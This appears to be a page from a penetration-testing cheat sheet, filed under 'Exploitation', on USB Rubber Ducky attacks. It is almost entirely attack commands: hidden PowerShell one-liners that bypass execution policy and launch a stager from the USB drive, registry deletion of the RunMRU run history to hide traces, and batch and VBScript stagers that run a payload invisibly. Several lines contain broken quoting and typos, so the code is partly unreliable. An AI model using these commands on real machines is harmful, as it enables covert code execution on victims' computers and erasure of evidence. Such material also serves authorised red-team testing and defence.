---
title: Rubber Ducky
category: Exploitation
order: 100
---

> **Find the Rubber Ducky’s drive letter** 

{% highlight bash %}
for /f %d in ('wmic volume get driveletter^, label^|findstr “DRIVENAME”'') do @set DK=%d 
{% endhighlight %}


> **Execute the Stager** 

{% highlight bash %}
powershell -NoP -NonI -W Hidden -Exec Bypass " $up = Get-WMIObject Win32Volume | ? { $_.Label -eq 'DriveName' } | select name; cd $uP.name; .\d.cmd"
{% endhighlight %}

> **Clean up run history** 

{% highlight bash %}
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
{% endhighlight %}

> **Run the Program and Clean-up**

{% highlight bash %}
powershell -NoP -NonI -W Hidden -Exec Bypass "rp -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue; $up = Get-WMIObject Win32Volume | ? { $_.Label -eq 'DN' } | select name; cd $uP.name; .\d.cmd"
#Note: Runtime max is 260 characters - use aliases to reduce
#Note: _ is Drive Name
{% endhighlight %}

{% highlight bash %}
#Second Version
powershell "$u=gwmi Win32_Volume|?($_Label -eq'_')|select name; cd $uname;.\d.cmd"
#65 Character Version
powershell".((gwmi win32_volume -f 'label=''_''').Name+'d.cmd')"
#Note: Runtime max is 260 characters - use aliases to reduce
#Note: _ is Drive Name
{% endhighlight %}

> **d.cmd: Stager - Executes Payload** 

{% highlight bash %}
@echo off
REM start /MIN e.cmd
@cls
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}')"
cscript i.vbs e.cmd
@exit
#Note: Powershell portion flashes the CAPS lock button to demonstrate that the first stage has completed successfully
{% endhighlight %}

> **i.vbs: Stager 2 - Executes Payload** 
{% highlight vb %}
CreateObject(""Wscript.Shell").Run """ & WScript.Arguments(0) & """, 0, False
{% endhighlight %}

